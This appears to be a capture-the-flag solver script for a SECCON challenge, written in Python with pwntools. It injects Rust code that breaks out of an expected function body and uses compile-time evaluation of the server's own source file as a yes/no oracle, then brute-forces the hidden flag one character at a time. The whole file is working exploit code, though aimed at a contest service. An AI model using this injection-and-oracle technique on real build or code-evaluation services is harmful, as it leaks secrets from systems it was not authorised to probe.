import os
import pwn
import string
import time

pwn.context.log_level = "error"


def communicate(program: str):
    TRY_NUM = 5

    def f():
        assert len(program) <= 512
        io = pwn.remote(os.getenv("SECCON_HOST"), os.getenv("SECCON_PORT"))
        io.sendlineafter(b"):", program.encode())
        io.sendline(b"__EOF__")

        res = io.recvall().decode().strip()
        io.close()
        return res

    for _ in range(TRY_NUM):
        res = f()
        if "timeout" not in res:
            return res
        print("timeout")
        time.sleep(4)
    assert False


TEMPLATE = """
}

static _CTFE: () = _contains(b"{{QUERY}}");

const fn _contains(query: &[u8]) {
    let content = include_bytes!(file!());

    let mut i = 350;
    while i < content.len() {
        let mut j = 0;
        while j < query.len() && i + j < content.len() && content[i + j] == query[j] {
            j += 1;
        }
        if j == query.len() {
            return; // found!
        }
        i += 1;
    }
    assert!(false); // not found
""".strip().replace("    ", "")


def oracle(query: str) -> bool:
    program = TEMPLATE.replace("{{QUERY}}", query)
    return ":)" in communicate(program)


CHARS = "}_" + string.ascii_lowercase + string.digits
known = "SECCON{"
while not known.endswith("}"):
    for c in CHARS:
        if oracle(known + c):
            known += c
            break
    else:
        print("Not found")
        exit(1)
    print(known)
print("Flag: " + known)
